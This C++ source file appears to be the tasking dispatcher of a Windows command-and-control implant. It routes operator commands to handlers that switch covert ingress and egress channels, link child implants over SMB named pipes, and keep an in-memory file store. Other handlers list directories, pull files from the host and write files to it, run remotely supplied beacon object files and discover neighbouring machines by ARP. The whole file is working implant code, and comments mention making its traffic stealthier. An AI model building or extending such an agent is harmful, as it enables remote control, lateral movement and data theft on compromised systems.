/*

Command tree


...
results methodology:

message: A message for the operator. This is either a direct output from windows `FormatMessageA`, or something else if not using windows api.
data: This holds the data output of the action. Ex, `ls`, data will hold the file list. 
    > note, more specific fields may be included, such as `comms_get_strategy`, and `comms_post_strategy`, when multiple fields are needed.
    > These should be documented (somewhere...) by me eventually. By default, the GUI spits all response fields out into the terminal.

windows_error_code: A windows error code to always include (even 0, on success). Helfpul for knowing whaat went wrong/passing through
errors without relying on addtl branch logic. I try to use windows error  macro defs where possible (ex, ERROR_SUCCESS).
    
*/


#include "protocols/json/json.h"
#include <iostream>
#include "modules/cd.h"
#include "modules/ls.h"
#include "modules/files.h"
#include "modules/bof.h"
#include "modules/discover.h"
#include "data/msgpack/msgpack.h"
#include "settings.h"
#include "data/structs.h"
#include "systems/memstore.h"
#include <string_view>
#include <windows.h>
#include <string>
#include "systems/childhandler.h"
#include "comms/queues.h"
#include "core/c2.h"
#include "protocols/smb/smb.h"
#include "_debug/debug.h"
#include "defense/winapi.h"
//move to own file?
std::string GetErrorMessage(DWORD dwErrorCode) {
    if (dwErrorCode == ERROR_SUCCESS) {
        return "Success";
    }

    LPSTR messageBuffer = nullptr;

    // Ask Windows to find the message and allocate the required memory
    size_t size = WinApi::FormatMessageA(
        FORMAT_MESSAGE_ALLOCATE_BUFFER |
        FORMAT_MESSAGE_FROM_SYSTEM |
        FORMAT_MESSAGE_IGNORE_INSERTS,
        NULL,
        dwErrorCode,
        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
        (LPSTR)&messageBuffer,
        0,
        NULL
    );


    if (size == 0 || messageBuffer == nullptr) {
        return "Unknown error code: " + std::to_string(dwErrorCode);
    }

    // Copy the message into a std::string
    std::string message(messageBuffer, size);

    // Free the buffer allocated by the system
    WinApi::LocalFree(messageBuffer);

    //clean up windows stuff
    //if (!message.empty() && message.back() == '\n') message.pop_back();
    //if (!message.empty() && message.back() == '\r') message.pop_back();

    return message;
}

//Helpers
std::vector<uint8_t> deref_memstore_content(std::string memstore_name_with_deref_symbol) {
    DEBUG_LOG("[deref_memstore_content]: Dereferencing " << memstore_name_with_deref_symbol << " from memstore");

    //nuke the `*` from the memstore name
    //ex, *mydata -> mydata
    memstore_name_with_deref_symbol.erase(0, 1);

    //sanity check to make sure the name is not empty for some reason
    if (memstore_name_with_deref_symbol.empty()) {
        DEBUG_LOG("[deref_memstore_content]: " << memstore_name_with_deref_symbol << " was empty");
        //reutrn a blank vector if the name is blank
        return std::vector <uint8_t> {};
    }

    //get memstore data
    std::vector<uint8_t> memstore_file_bytes = MemStore::instance().get(memstore_name_with_deref_symbol);

    return memstore_file_bytes;
}

std::vector<uint8_t> determine_if_argument_is_data_or_memstore_pointer(const nlohmann::json& element) {
    // Case 1: Raw Binary (Standard)
    if (element.is_binary()) {
        return element.get_binary();
    }

    // Case 2: String (Could be text or a pointer)
    if (element.is_string()) {
        std::string s = element.get<std::string>();

        // Check for MemStore Pointer (*key)
        if (!s.empty() && s[0] == '*') {
            return deref_memstore_content(s);
        }
    }
    //return blank vector if nothing?
    return {};
}

bool IsStrategyValid(const std::string& strategy, const std::string& setting_key) {
    auto allowed = SettingsManager::instance().get<std::vector<std::string>>(setting_key, {});
    for (const auto& s : allowed) {
        if (s == strategy) return true;
    }
    return false;
}

// ==

//take in the mapped object, after converted from msgpack
//all command splitting/overhead logic is done here, then passed to the appropriate modules
nlohmann::json command_tree(nlohmann::json task_data) {
    //Note, if ever a vector of tasks, do a for loop over said vector here - or have caller call command_tree multiple times. both are fair options. 
    std::string task_name = task_data["task"]["task_name"];
    //basic checks for the task. 
    if (task_name.empty()) {
        nlohmann::json result;
        result["data"] = "";
        result["windows_error_code"] = ERROR_INVALID_PARAMETER;
        result["message"] = GetErrorMessage(ERROR_INVALID_PARAMETER);
        return result;
    }
    DEBUG_LOG("[command_tree]: " << task_name);

    /*
    Strat commands
    */
    if (task_name == "strat set get") {
        nlohmann::json result;
        std::string target_strat = task_data["task"]["args"]["strategy_name"];

        auto allowed_strats = SettingsManager::instance().get<std::vector<std::string>>("comms_get_strats", {});

        bool found = false;
        for (const auto& strat : allowed_strats) {
            if (strat == target_strat) {
                found = true; 
                break;
            }
        }

        if (found) {
            SettingsManager::instance().set("comms_get_function", target_strat);
            result["data"] = "Ingress strategy successfully updated to: " + target_strat;
            result["windows_error_code"] = 0; // ERROR_SUCCESS
        }
        else {
            result["data"] = "Error: Strategy '" + target_strat + "' not found. Run 'strat list' to see valid options.";
            result["windows_error_code"] = 2; // ERROR_FILE_NOT_FOUND
        }

        result["message"] = GetErrorMessage(result["windows_error_code"]);
        return result;
    }

    else if (task_name == "strat set post") {
        nlohmann::json result;
        std::string target_strat = task_data["task"]["args"]["strategy_name"];

        auto allowed_strats = SettingsManager::instance().get<std::vector<std::string>>("comms_post_strats", {});

        bool found = false;
        for (const auto& strat : allowed_strats) {
            if (strat == target_strat) {
                found = true; 
                break;
            }
        }

        if (found) {
            SettingsManager::instance().set("comms_post_function", target_strat);
            result["data"] = "Egress strategy successfully updated to: " + target_strat;
            result["windows_error_code"] = 0;
        }
        else {
            result["data"] = "Error: Strategy '" + target_strat + "' not found. Run 'strat list' to see valid options.";
            result["windows_error_code"] = 2;
        }

        result["message"] = GetErrorMessage(result["windows_error_code"]);
        return result;
    }

    // --- BOTH Handler ---
    else if (task_name == "strat set both") {
        nlohmann::json result;
        std::string get_strat = task_data["task"]["args"]["get_strategy_name"];
        std::string post_strat = task_data["task"]["args"]["post_strategy_name"];

        bool get_valid = IsStrategyValid(get_strat, "comms_get_strats");
        bool post_valid = IsStrategyValid(post_strat, "comms_post_strats");

        if (get_valid && post_valid) {
            SettingsManager::instance().set("comms_get_function", get_strat);
            SettingsManager::instance().set("comms_post_function", post_strat);
            
            result["data"] = "Symmetry updated. Ingress: " + get_strat + " | Egress: " + post_strat;
            result["windows_error_code"] = ERROR_SUCCESS;
        } 
        else {
            result["data"] = "Error: Update failed. One or more strategies invalid.";
            result["windows_error_code"] = ERROR_NOT_FOUND;
        }

        result["message"] = GetErrorMessage(result["windows_error_code"]);
        return result;
    }

    else if (task_name == "strat list") {
        nlohmann::json result;
        std::string output = "--- Ingress (GET) ---\n";

        auto get_list = SettingsManager::instance().get<std::vector<std::string>>("comms_get_strats", {});
        for (const auto& name : get_list) {
            output += "  > " + name + "\n";
        }

        output += "\n--- Egress (POST) ---\n";
        auto post_list = SettingsManager::instance().get<std::vector<std::string>>("comms_post_strats", {});
        for (const auto& name : post_list) {
            output += "  > " + name + "\n";
        }

        result["data"] = output;
        result["windows_error_code"] = ERROR_SUCCESS;
        result["message"] = GetErrorMessage(ERROR_SUCCESS);

        return result;
    }
    else if (task_name == "strat active") {
        nlohmann::json result;

        std::string get_strategy = SettingsManager::instance().get<std::string>("comms_get_function", "");
        std::string post_strategy = SettingsManager::instance().get<std::string>("comms_post_function", "");

        // Format the "data" field so the operator gets a clean visual read
        //probably can strip this out for more stealthy comms
        std::string output = "--- Active Transport Strategies ---\n";
        output += "Ingress (GET)  : " + get_strategy + "\n";
        output += "Egress (POST) : " + post_strategy + "\n";

        result["data"] = output;
        result["windows_error_code"] = ERROR_SUCCESS;
        result["message"] = GetErrorMessage(ERROR_SUCCESS);

        // Keep the raw JSON fields in case your Python Team Server relies on them for UI mapping
        result["comms_get_strategy"] = get_strategy;
        result["comms_post_strategy"] = post_strategy;

        return result;
    }
    /*
    System/Systems commands
    For now, have hardcoded message, data, and windows_error_code. Not module based
    */
    else if (task_name == "exit") {
        //no return, just kill it
        //maybe move me to a module later for different shutdown options
        exit(0);
    }
    else if (task_name == "sleep") {
        nlohmann::json result;

        //should be an int, should prolly do some error handling here, but for now, just assume the user is giving us good data.
        int sleep_time = task_data["task"]["args"]["sleep_time"];
        
        SettingsManager::instance().set("sleep_time", sleep_time);

        //add_text_result(result, "message", "Sleep set to: " + std::to_string(sleep_time));
        result["data"] = "";
        result["windows_error_code"] = ERROR_SUCCESS;
        result["message"] = GetErrorMessage(ERROR_SUCCESS);

        return result;
    }

    /*
    Link commands
    */
    else if (task_name == "link smb") {
        //update link class with info we need

        nlohmann::json result;

        //make sure all of our args are present
        auto& args = task_data["task"]["args"];
        if (!args.contains("target") || !args["target"].is_string()) {
            result["error"] = "Task failed: 'target' is missing or not a string";
            return result;
        }

        if (!args.contains("protocol") || !args["protocol"].is_string()) {
            result["error"] = "Task failed: 'protocol' is missing or not a string";
            return result;
        }

        if (!args.contains("inbox_pipe") || !args["inbox_pipe"].is_string()) {
            result["error"] = "Task failed: 'inbox_pipe' is missing or not a string";
            return result;
        }

        if (!args.contains("outbox_pipe") || !args["outbox_pipe"].is_string()) {
            result["error"] = "Task failed: 'outbox_pipe' is missing or not a string";
            return result;
        }

        //host we connect to
        if (!args.contains("target") || !args["target"].is_string()) {
            result["error"] = "Task failed: 'target' is missing or not a string";
            return result;
        }

        //setup our struct for the childhandler class
        ChildRouteInfo cri;
        //cri.target_uuid = args["child_uuid"];

        // Map the protocol string to our internal Enum
        std::string protocol = args["protocol"];
        if (protocol == "smb" || protocol == "pipe") {
            cri.route_type = ROUTE_SMB_PIPE;
        }
        //else if (protocol == "tcp") { //not implemented yet
        //    cri.route_type = ROUTE_TCP_SOCKET; 
        //}
        else {
            result["error"] = "Task failed: Unknown protocol '" + protocol + "'.";
            return result;
        }

        // Format the pipe names and convert std::string to std::wstring
        // Assuming the operator just passes "inbox2", we prepend the Windows pipe path format.
        //kinda fragile, should probably think about how to take bad pipe name input here
        //std::string raw_inbox = "\\\\.\\pipe\\" + args["inbox_pipe"].get<std::string>();
        //std::string raw_outbox = "\\\\.\\pipe\\" + args["outbox_pipe"].get<std::string>();

        //note - this should be updated to use the strat name of the pipes instead of what is passed in
        //or, server can track this. decision for later. 
        //this is parent side
        std::string target_host = args["target"];
        std::string raw_inbox = "\\\\" + target_host + "\\pipe\\" + args["inbox_pipe"].get<std::string>();
        std::string raw_outbox = "\\\\" + target_host + "\\pipe\\" + args["outbox_pipe"].get<std::string>();

        cri.pipe_inbox = std::wstring(raw_inbox.begin(), raw_inbox.end());
        cri.pipe_outbox = std::wstring(raw_outbox.begin(), raw_outbox.end());
        cri.host_address = target_host;

        //poking child
        if (cri.route_type == ROUTE_SMB_PIPE) {
            DEBUG_LOG("Waiting for connection from child");

            //wait and connect to inbox
            DEBUG_LOG("Waiting for INBOX pipe to become available...");
            if (!WinApi::WaitNamedPipeW(cri.pipe_inbox.c_str(), 5000)) {
                result["error"] = "Timeout waiting for INBOX pipe. Child might be dead or busy.";
                return result;
            }
            HANDLE h_parent_write = WinApi::CreateFileW(cri.pipe_inbox.c_str(), GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
            if (h_parent_write == INVALID_HANDLE_VALUE) {
                result["error"] = "Failed to open INBOX pipe. Error: " + std::to_string(WinApi::GetLastError());
                return result;
            }

            // wait & connect to outbox
            DEBUG_LOG("INBOX connected. Waiting for OUTBOX pipe to become available...");
            if (!WinApi::WaitNamedPipeW(cri.pipe_outbox.c_str(), 5000)) {
                WinApi::CloseHandle(h_parent_write); 
                result["error"] = "Timeout waiting for OUTBOX pipe. Child dropped connection.";
                return result;
            }
            HANDLE h_parent_read = WinApi::CreateFileW(cri.pipe_outbox.c_str(), GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
            if (h_parent_read == INVALID_HANDLE_VALUE) {
                WinApi::CloseHandle(h_parent_write);
                result["error"] = "Failed to open OUTBOX pipe. Error: " + std::to_string(WinApi::GetLastError());
                return result;
            }

            if (h_parent_write != INVALID_HANDLE_VALUE && h_parent_read != INVALID_HANDLE_VALUE) {
                DEBUG_LOG("Pipes connected. Waiting for child to check in...");
                cri.h_pipe_inbox = h_parent_write;
                cri.h_pipe_outbox = h_parent_read;

                // CRITICAL: Force the read handle into Message Mode so MsgPack doesn't fragment
                DWORD mode = PIPE_READMODE_MESSAGE;
                if (!WinApi::SetNamedPipeHandleState(cri.h_pipe_outbox, &mode, NULL, NULL)) {
                    std::cerr << "Failed to set pipe to message mode. Error: " << GetLastError() << std::endl;
                }

                // Use our new dynamic reader!
                std::vector<uint8_t> request_bytes;
                DWORD read_status = SMB::read_pipe_dynamic(cri.h_pipe_outbox, request_bytes);

                if (read_status != ERROR_SUCCESS || request_bytes.empty()) {
                    DEBUG_LOG("Pipe broke or child disconnected. Error: " << read_status);
                    result["error"] = "Pipe broke or child disconnected";
                    return result;
                }

                try {
                    // It is an ARRAY!
                    nlohmann::json child_request_array = nlohmann::json::from_msgpack(request_bytes);

                    if (!child_request_array.is_array() || child_request_array.empty()) {
                        throw std::runtime_error("Child sent empty or invalid array format.");
                    }

                    // Grab the actual check-in object from the array
                    nlohmann::json child_request = child_request_array[0];
                    std::string child_uuid = child_request["implant_uuid"];

                    // Add uuid to cri and register to child handler
                    cri.child_uuid = child_uuid;
                    ChildHandler::instance().add_child(child_uuid, cri);

                    // Push the whole array to the GET queue
                    //GetQueue::push(child_request_array);
                    //take all items from child (should just be metadata) and send them back up
                    for (const auto& item : child_request_array) {
                        GetQueue::push(item);
                    }

                    // Immediatly feed it a nothingburger task to "reset" it back to sending a GET
                    nlohmann::json task_list = nlohmann::json::array();
                    std::vector<uint8_t> msgpack_payload = nlohmann::json::to_msgpack(task_list);

                    DWORD bytes_written = 0;
                    WinApi::WriteFile(cri.h_pipe_inbox, msgpack_payload.data(), static_cast<DWORD>(msgpack_payload.size()), &bytes_written, NULL);

                }
                catch (const std::exception& e) {
                    std::cerr << "Exception during link: " << e.what() << std::endl;
                    result["error"] = "Something went wrong linking to the implant";
                    return result;
                }
            }
            else {
                //for invliad handels, i.e. bad perms, etc.
                int windows_error_code = WinApi::GetLastError();
                result["message"] = GetErrorMessage(windows_error_code);
                result["windows_error_code"] = windows_error_code;
                return result;
            }
            // Return success back to the C2 server
            result["data"]["child_uuid"] = cri.child_uuid;
            result["message"] = "Successfully linked to child implant " + protocol + ".";
            result["windows_error_code"] = 0; // ERROR_SUCCESS
            return result;
        }
    }
    else if (task_name == "unlink smb") {
        nlohmann::json result;

        //make sure all of our args are present
        auto& args = task_data["task"]["args"];
        if (!args.contains("child_uuid") || !args["child_uuid"].is_string()) {
            result["error"] = "Task failed: 'child_uuid' is missing or not a string";
            return result;
        }

        std::string child_uuid = task_data["task"]["args"]["child_uuid"];

        //init route stuff
        ChildRouteInfo cri;

        if (ChildHandler::instance().get_child(child_uuid, cri) == false) {
            result["error"] = "Could not find child";
            return result;
        }

        DEBUG_LOG("Unlinking child: " << child_uuid);

        // Close the handles to the child implant
        if (cri.h_pipe_inbox != INVALID_HANDLE_VALUE) {
            WinApi::CloseHandle(cri.h_pipe_inbox);
        }
        if (cri.h_pipe_outbox != INVALID_HANDLE_VALUE) {
            WinApi::CloseHandle(cri.h_pipe_outbox);
        }

        // nuke from routing table
        ChildHandler::instance().remove_child(child_uuid);

        result["message"] = "Successfully unlinked and closed pipes for child " + child_uuid;
        result["windows_error_code"] = 0;
        return result;
    }
    /*
    Memstore commands
    */
    else if (task_name == "memstore upload") {
        nlohmann::json result;

        auto& args = task_data["task"]["args"];
        if (!args.contains("file_contents") || !args["file_contents"].is_binary()) {
            result["error"] = "Task failed: 'file_contents' is missing or not binary.";
            return result;
        }
        if (!args.contains("file_name") || !args["file_name"].is_string()) {
            result["error"] = "Task failed: 'file_name' is missing or not a string.";
            return result;
        }

        std::string file_name = task_data["task"]["args"]["file_name"];

        //get element
        auto& json_element = task_data["task"]["args"]["file_contents"];
        //turn into bytes, tldr, need to call get_binary from nholmann json to get proper bin data
        std::vector<uint8_t> file_bytes;
        file_bytes = json_element.get_binary();

        int windows_error_code = MemStore::instance().store(file_name, file_bytes);

        //store does not have a return type/good way to check success yet, for now, assuming it was successful
        //could do a "num of items before, then add, and if items = items +1"
        result["data"] = "";
        result["windows_error_code"] = windows_error_code;
        result["message"] = GetErrorMessage(windows_error_code);
        return result;


    }
    else if (task_name == "memstore download") {
        nlohmann::json result;

        auto& args = task_data["task"]["args"];
        if (!args.contains("file_name") || !args["file_name"].is_string()) {
            result["error"] = "file_name is missing";
            return result;
        }

        std::string memstore_file_to_download = task_data["task"]["args"]["file_name"];

        std::vector<uint8_t> memstore_file_bytes = MemStore::instance().get(memstore_file_to_download);

        //add_bytes_result(result, "data", memstore_file_bytes);
        result["data"] = "";
        result["windows_error_code"] = ERROR_SUCCESS;
        result["message"] = GetErrorMessage(ERROR_SUCCESS);
        return result;
    }
    else if (task_name == "memstore delete") {
        nlohmann::json result;

        //check for correct values
        auto& args = task_data["task"]["args"];
        if (!args.contains("file_name") || !args["file_name"].is_string()) {
            result["error"] = "Task failed: 'file_name' is missing or not string.";
            return result;
        }

        std::string memstore_file_to_remove = task_data["task"]["args"]["file_name"];

        int windows_error_code = MemStore::instance().remove(memstore_file_to_remove);
        result["data"] = "";
        result["windows_error_code"] = windows_error_code;
        result["message"] = GetErrorMessage(windows_error_code);
        return result;


    }
    else if (task_name == "memstore clear") {
        nlohmann::json result;

        //currently always returns success
        int windows_error_code = MemStore::instance().clear();

        result["data"] = "";
        result["windows_error_code"] = windows_error_code;
        result["message"] = GetErrorMessage(windows_error_code);
        return result;

    }
    else if (task_name == "memstore list") {
        nlohmann::json result;

        std::vector<std::string> file_names = MemStore::instance().get_file_names();

        std::string output;
        for (std::string file_name : file_names) {
            output += file_name;
            output += "\n";
        }

        //DEBUG_LOG(output);

        //add_text_result(result, "data", output);
        //hardcode response, memstore does not have same return values as modules,  as it's not a module

        result["windows_error_code"] = ERROR_SUCCESS;
        result["message"] = GetErrorMessage(ERROR_SUCCESS);
        result["data"] = output;

        return result;
    }
    /*
    Modules
    Note: return values are directly pulled from modules, message, data and windows_error_code
    */
    else if (task_name == "ls") {
        nlohmann::json result;
        //get args, which are named compontents in the task->args block of the task_data
        std::string directory_to_list = task_data["task"]["args"]["directory"];
        //do a validation here

        //If for whatever reason, there is a blank directory, fallback to current directory. This is checked on the Client as well,but an "ls" may slip through without a dir on via the API.
        if (directory_to_list.empty()) {
            directory_to_list = "."; //set to current dir if no directory is provided
        }

        ModuleResult module_result = ls(directory_to_list);
        //std::string files_list = module_result.data;
        DWORD windows_error_code = module_result.windows_error_code;


        result["windows_error_code"] = windows_error_code;
        result["message"] = GetErrorMessage(windows_error_code);
        result["data"] = module_result.data;


        return result;
    }
    else if (task_name == "cd") {
        //std::string temp_path = "C:\\";

        //get args, which are named compontents in the task->args block of the task_data
        std::string directory_to_traverse_to = task_data["task"]["args"]["directory"];
        //do a validation here
        
        //setup json object to return. This will be plugged into the result. 
        nlohmann::json result;


        ModuleResult module_result = cd(directory_to_traverse_to);
        std::string data = module_result.data;
        DWORD windows_error_code = module_result.windows_error_code;

        result["windows_error_code"] = windows_error_code;
        result["message"] = GetErrorMessage(windows_error_code);
        result["data"] = module_result.data;
        return result;

    }
    else if (task_name == "file download") {
        nlohmann::json result;

        //check for correct values
        auto& args = task_data["task"]["args"];
        if (!args.contains("file_path") || !args["file_path"].is_string()) {
            result["error"] = "Task failed: 'file_path' is missing or not a string.";
            return result;
        }

        //get file path from command
        std::string file_path = task_data["task"]["args"]["file_path"];

        //std::string file_contents = get_file(file_path);
        ModuleResult module_result = get_file(file_path);
        std::string file_contents = module_result.data;
        DWORD windows_error_code = module_result.windows_error_code;

        if (file_contents.empty()) {
            result["windows_error_code"] = windows_error_code;
            result["message"] = "The file appears to be empty";
            return result;

        }

        result["windows_error_code"] = windows_error_code;
        result["message"] = GetErrorMessage(windows_error_code);
        result["data"] = module_result.data;

        return result;
    }
    else if (task_name == "file upload") {
        nlohmann::json result;

        //check for correct values
        auto& args = task_data["task"]["args"];

        // 1. Validate Inputs
        if (!args.contains("file_path") || !args.contains("file_contents")) {
            throw std::runtime_error("Missing required arguments: file_path or file_contents");
        }

        // Extract Data 
        std::string file_path = args["file_path"];
        std::vector<uint8_t> file_bytes = determine_if_argument_is_data_or_memstore_pointer(args["file_contents"]);

        // sanity check to make sure that the vector is not empty.
        if (file_bytes.empty()) {
            result["error"] = "File content was empty(or invalid pointer).Wrote 0 bytes.";
            return result;
        }

        ModuleResult module_result = put_file(file_bytes, file_path);
        std::string data = module_result.data;
        DWORD windows_error_code = module_result.windows_error_code;

        result["windows_error_code"] = windows_error_code;
        result["message"] = GetErrorMessage(windows_error_code);
        result["data"] = module_result.data;


        return result;
    }
    else if (task_name == "bof") {
        nlohmann::json result;

        //check for correct values
        auto& args = task_data["task"]["args"];

        // Validate Inputs
        if (!args.contains("bof_contents") || !args.contains("bof_args")) {
            //throw std::runtime_error("Missing required arguments: bof_contents, bof_args");
            result["error"] = "Missing bof_contents or bof_args";

            return result;
        }

        // Extract Data 
        std::string bof_args = args["bof_args"];
        std::vector<uint8_t> bof_bytes = determine_if_argument_is_data_or_memstore_pointer(args["bof_contents"]);

        // sanity check to make sure that the vector is not empty.
        if (bof_bytes.empty()) {
            result["error"] = "bof content was empty (or invalid pointer)";

            return result;
        }

        ModuleResult module_result = run_bof(bof_bytes, bof_args);
        std::string data = module_result.data;
        DWORD windows_error_code = module_result.windows_error_code;

        result["windows_error_code"] = windows_error_code;
        result["message"] = GetErrorMessage(windows_error_code);
        result["data"] = module_result.data;


        return result;
    }
    else if (task_name == "discover neighbors") {
        nlohmann::json result;

        ModuleResult module_result = passive_arp_discovery();
        DWORD windows_error_code = module_result.windows_error_code;

        result["data"] = module_result.data;
        result["windows_error_code"] = windows_error_code;
        result["message"] = GetErrorMessage(windows_error_code);

        return result;
    }
    else {
        nlohmann::json result;
        result["data"] = "";
        result["windows_error_code"] = ERROR_INVALID_PARAMETER;
        result["message"] = GetErrorMessage(ERROR_INVALID_PARAMETER);

        return result;
    }

}

//placeholder for  a beacon printf style func?
int send_to_server(std::string output) {
    DEBUG_LOG(output);
    return 0;
}